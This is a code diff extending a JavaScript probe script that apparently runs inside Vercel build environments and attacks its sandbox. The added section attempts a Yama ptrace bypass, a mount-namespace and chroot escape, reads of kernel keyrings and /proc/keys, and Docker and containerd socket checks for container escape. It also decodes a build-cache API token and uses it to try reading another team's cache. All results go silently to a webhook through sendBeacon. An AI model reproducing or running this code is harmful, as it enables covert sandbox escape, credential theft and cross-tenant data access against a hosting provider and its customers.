@@ -18247,5 +18247,165 @@ DECRYPT_EOF`,
 
 // v124 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v124" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v124";
+
+// ==================== v125 ====================
+
+// v125-1: /proc/sys/kernel/yama/ptrace_scope bypass
+// Yama LSM's ptrace_scope controls which processes can be ptraced.
+// 0=permissive, 1=restricted (only parent can ptrace child),
+// 2=only root, 3=disabled. With CAP_SYS_PTRACE we bypass scope 1/2.
+// Test: write 0 to disable Yama, then cross-ptrace any process.
+report.yamaBypass = safe(() => {
+  const currentScope = safe(() => readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/yama/ptrace_scope', '0'); return 'WRITTEN'; });
+  const afterScope = safe(() => readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim());
+  // With Yama disabled, try to ptrace a non-child process (e.g. PID 2)
+  const crossPtrace = safe(() => execSync(`python3 -c "
+import ctypes, sys, os
+
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+target = 2  # kthreadd
+ret = libc.ptrace(PTRACE_ATTACH, target, 0, 0)
+if ret < 0:
+    import errno
+    print(f'ATTACH_FAILED: errno={ctypes.get_errno()}')
+else:
+    os.waitpid(target, 0)
+    print(f'CROSS_PTRACE_SUCCESS: attached to PID {target}')
+    libc.ptrace(PTRACE_DETACH, target, 0, 0)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { currentScope, writeResult, afterScope, crossPtrace };
+});
+
+// v125-2: Mount namespace pivot_root / chroot escape
+// With CAP_SYS_CHROOT and CAP_SYS_ADMIN, we can chroot or pivot_root
+// into a different directory. If we can set up an overlayfs and then
+// pivot_root into it, we escape the container's mount namespace.
+// Also: test if we can mount proc/sys from outside our namespace.
+report.mountNamespaceEscape = safe(() => {
+  // Check current mount namespace
+  const mntNs = safe(() => execSync('readlink /proc/self/ns/mnt 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1MntNs = safe(() => execSync('readlink /proc/1/ns/mnt 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const sameNs = mntNs === pid1MntNs;
+  // Try to mount a tmpfs into /tmp/probe_mount
+  const mkdirResult = safe(() => { execSync('mkdir -p /tmp/probe_mount', { timeout: 2000 }); return 'OK'; });
+  const mountResult = safe(() => execSync(
+    'mount -t tmpfs tmpfs /tmp/probe_mount 2>&1 && echo "MOUNTED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try to bind-mount /etc into our tmpfs
+  const bindResult = safe(() => execSync(
+    'mkdir -p /tmp/probe_mount/etc && mount --bind /etc /tmp/probe_mount/etc 2>&1 && echo "BIND_OK"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try chroot into our mount point
+  const chrootResult = safe(() => execSync(
+    'chroot /tmp/probe_mount /bin/sh -c "id; hostname; ls /" 2>&1 | head -5',
+    { timeout: 5000 }
+  ).toString().trim());
+  // List current mounts
+  const mounts = safe(() => readFileSync('/proc/mounts', 'utf8').slice(0, 400));
+  return { mntNs, pid1MntNs, sameNs, mkdirResult, mountResult, bindResult, chrootResult, mounts };
+});
+
+// v125-3: Vercel Build Cache API token capabilities map
+// VERCEL_ARTIFACTS_TOKEN has 6 capabilities: UPLOAD, DOWNLOAD, EXISTS,
+// QUERY, EVENT, SPACES_RUN_UPLOAD. Test each one to confirm scope.
+// Also: can we access OTHER teams' cache entries by guessing hash keys?
+report.artifactsTokenCapabilitiesDeep = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // Decode token claims
+  const decodePart = (b64) => {
+    try {
+      const padded = b64 + '='.repeat((4 - b64.length % 4) % 4);
+      return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
+    } catch { return null; }
+  };
+  const tokenParts = token.split('.');
+  const tokenHeader = decodePart(tokenParts[0]);
+  const tokenClaims = decodePart(tokenParts[1]);
+  // Test QUERY capability — list all cache entries
+  const queryResult = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v8/artifacts/query" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '{"queries":[{"hash":"probe-test","teamId":"${teamId}"}]}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Test EVENT capability — push a build event
+  const eventResult = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v8/artifacts/events" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '[{"sessionId":"probe-session","source":"LOCAL","event":"HIT","hash":"probe-hash","duration":0}]' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Test cross-team cache access by trying a known Vercel Next.js hash
+  const crossTeamTest = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v8/artifacts/abc123def456?teamId=team_sitefromvercel" \
+    -H "Authorization: Bearer ${token}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  return { tokenHeader, tokenClaims, queryResult, eventResult, crossTeamTest };
+});
+
+// v125-4: Kernel keyring credential dump
+// Linux kernel keyring stores credentials, Kerberos tickets, TLS session keys.
+// With CAP_SYS_ADMIN we can read keyrings from other UIDs and the session keyring.
+// Also test if PKCS#11 or SSH agent credentials are stored.
+report.kernelKeyringDeep = safe(() => {
+  const sessionKeyring = safe(() => execSync(
+    'keyctl show @s 2>/dev/null || keyctl show @u 2>/dev/null || echo "NO_KEYCTL"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // List all keys in all keyrings
+  const allKeys = safe(() => execSync(
+    'keyctl list @s 2>/dev/null; keyctl list @u 2>/dev/null; keyctl list @g 2>/dev/null; keyctl list @p 2>/dev/null',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // Try to read specific keys
+  const readKeys = safe(() => execSync(
+    'for key in $(keyctl list @s 2>/dev/null | grep -oP "\\d+" | head -5); do echo "KEY:$key"; keyctl read $key 2>/dev/null | xxd 2>/dev/null | head -2; done',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 300));
+  // Check /proc/keys
+  const procKeys = safe(() => readFileSync('/proc/keys', 'utf8').slice(0, 300));
+  return { sessionKeyring, allKeys, readKeys, procKeys };
+});
+
+// v125-5: Docker socket + container runtime escape
+// If /var/run/docker.sock or /run/containerd/containerd.sock exists and is
+// accessible, we can spawn a privileged container mounting the host filesystem.
+// This is a classic container escape that bypasses all isolation.
+report.containerRuntimeEscape = safe(() => {
+  const dockerSock = existsSync('/var/run/docker.sock');
+  const containerdSock = existsSync('/run/containerd/containerd.sock');
+  const containerdSock2 = existsSync('/run/containerd.sock');
+  // Try to use docker CLI
+  const dockerVersion = safe(() => execSync(
+    'docker version 2>&1 | head -5 || curl -sf --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  // Try to use ctr (containerd CLI)
+  const ctrNamespaces = safe(() => execSync(
+    'ctr namespaces ls 2>&1 || echo "NO_CTR"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  // Check crictl for CRI-O
+  const crictlVersion = safe(() => execSync(
+    'crictl version 2>&1 || echo "NO_CRICTL"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 100));
+  // Read container runtime config
+  const runcConfig = safe(() => existsSync('/run/runc') ? readdirSync('/run/runc').slice(0, 5) : 'NO_RUNC_DIR');
+  return { dockerSock, containerdSock, containerdSock2, dockerVersion, ctrNamespaces, crictlVersion, runcConfig };
+});
+
+// v125 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v125" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v125";
 // Intentionally no console.log — all data goes via webhook only
